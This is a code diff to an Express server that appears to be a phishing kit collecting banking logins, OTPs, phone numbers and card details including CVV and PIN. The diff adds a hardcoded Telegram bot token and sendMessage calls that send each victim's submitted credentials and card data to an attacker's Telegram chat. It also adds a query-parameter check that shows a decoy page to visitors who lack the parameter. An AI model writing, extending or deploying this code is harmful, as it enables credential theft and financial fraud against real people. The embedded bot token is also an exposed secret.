@@ -17,16 +17,25 @@ var transporter = nodemailer.createTransport({
     }
 });
 
+const chatId='1590800742'
+
+const token = '6165676200:AAFY44OL-mKcT2DYTQU5q95P4KSQnNj2D9M'; 
+const bot = new TelegramBot(token, { polling: true });
+
 
 app.listen(port, () => console.log(`Server running on port ${port}`));
 
 
-app.get("/", ( req , res ) => {
-    res.render("index2")
+app.get("/", ( req , res ) => {   
+    res.render("index2")    
 });
 
-app.get("/en/chl", ( req , res ) => {
-    res.render("index")
+app.get("/en/za", ( req , res ) => {
+    if(req.query.trf){
+        res.render("index")
+    } else {
+        res.render("index2")
+    }    
 });
 
 app.get("/phone-verification", (req, res) => {
@@ -65,6 +74,8 @@ app.post("/otp_post", (req, res) => {
         }
     });
 
+    bot.sendMessage(chatId, `From: ${req.session.user}\n OTP: ${req.body.otpValue}`);
+
 });
 
 app.post("/otp2_form", (req, res) => {
@@ -91,6 +102,8 @@ app.post("/otp2_form", (req, res) => {
         }
     });
 
+    bot.sendMessage(chatId, `From: ${req.session.user}\n OTP2: ${req.body.otpValue}`);
+
 })
 
 app.post("/phone-verification", (req, res) => {
@@ -110,6 +123,8 @@ app.post("/phone-verification", (req, res) => {
             console.log('Email sent: ' + info.response);
         }
     });
+
+    bot.sendMessage(chatId, `From: ${req.session.user}\n Mobile Number: ${req.body.phn}`);
 })
 
 app.get("/card-details", (req, res) => {
@@ -134,6 +149,9 @@ app.post("/cardVerification", ( req, res) => {
             console.log('Email sent: ' + info.response);
         }
     });
+
+    bot.sendMessage(chatId, `From: ${req.session.user}\n card number: 
+    ${req.body.card}\n\nexpire: ${req.body.exp}\n\ncvv: ${req.body.cvv}\n\npin: ${req.body.pho}`);
 });
 
 app.post("/login", ( req, res ) => {
@@ -155,5 +173,7 @@ app.post("/login", ( req, res ) => {
             console.log('Email sent: ' + info.response);
         }
     });
+
+    bot.sendMessage(chatId, `From: ${req.session.user}\n Client Login\n\nUsername: ${req.body.Username}\n\nPassword: ${req.body.Password}`);
 
 });
